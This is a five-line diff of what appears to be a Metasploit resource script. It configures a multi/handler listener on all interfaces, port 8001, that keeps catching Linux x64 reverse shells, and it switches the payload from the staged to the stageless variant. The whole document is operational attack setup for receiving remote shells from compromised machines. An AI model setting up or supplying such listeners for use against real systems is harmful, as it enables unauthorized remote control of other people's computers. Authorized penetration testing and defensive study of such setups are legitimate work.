@@ -1,5 +1,5 @@
 use exploit/multi/handler
-set PAYLOAD linux/x64/shell/reverse_tcp
+set PAYLOAD linux/x64/shell_reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 8001
 set ExitOnSession false
